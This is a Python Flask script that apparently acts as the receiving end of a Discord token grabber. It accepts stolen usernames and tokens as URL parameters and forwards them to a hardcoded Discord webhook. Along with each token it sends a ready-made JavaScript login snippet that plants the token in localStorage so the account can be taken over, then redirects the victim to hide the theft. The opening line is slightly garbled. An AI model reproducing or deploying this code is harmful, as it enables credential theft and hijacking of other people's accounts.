ameimport dhooks
import os
import requests

from flask import Flask, redirect, request, render_template
from dhooks import Webhook, Embed

hook = ("https://discord.com/api/webhooks/1275710508603015180/o-eYyR4ISHLF3ozmAtd103Rzo2GsZ_PkuOB6_o4581_s54EPb7K32U8tNxd75_hKMwqQ")
app = Flask(__name__)


@app.route('/keep_alive')
def keep_alive():
    print('hello')
    return 'hi'


@app.route('/')
def main_page():
    try:
        token = None
        try:
            token = request.args.get('token').replace(
                '""', "").replace('"', "")
            redirect_url = request.args.get('url').replace(
                '""', "").replace('"', "")
        except:
            return 'hi'
        token_str = str(token)
        original = token_str
        username = None
        if token_str:
            token_str = original.split(" : ")[1]
            username = original.split(" : ")[0]
        try:
            code = '```javascript\nlet token="**token_str**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
            code = code.replace('**token**', token)
            embed = {"title": username, "description": token_str, "fields": [{"name": "Javascript Code", "value": code, "inline": False}]}
            data = {
                "embeds": [embed],
            }
            response = requests.post(hook,json=data)
            print(response.json(), response.text(), response.status_code())
        except:
            return redirect(redirect_url)
    except:
        return redirect(redirect_url)
    return redirect(redirect_url)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
